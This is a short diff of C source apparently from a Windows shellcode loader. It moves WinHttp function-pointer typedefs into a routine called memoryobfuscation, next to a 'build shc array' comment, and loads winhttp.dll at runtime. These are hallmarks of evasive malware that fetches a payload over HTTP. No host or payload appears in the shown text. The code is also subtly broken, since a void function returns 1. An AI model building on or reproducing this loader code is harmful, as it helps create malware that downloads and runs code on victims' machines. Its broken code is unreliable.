@@ -65,17 +65,6 @@ void PtrToHexStr(void* ptr, char* buf, int* idx) {
 }
 
 
-typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
-typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
-typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
-typedef BOOL      (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
-typedef BOOL      (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
-typedef BOOL      (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
-typedef BOOL      (WINAPI *WinHttpCloseHandle_t)(HINTERNET);
-
-
-
-
 void memoryobfuscation(){
 
   
@@ -148,6 +137,14 @@ void memoryobfuscation(){
     }
 
     // build shc array
+
+    typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+    typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+    typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+    typedef BOOL      (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+    typedef BOOL      (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
+    typedef BOOL      (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
+    typedef BOOL      (WINAPI *WinHttpCloseHandle_t)(HINTERNET);
 
     HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
     if (!hWinHttp) return 1;
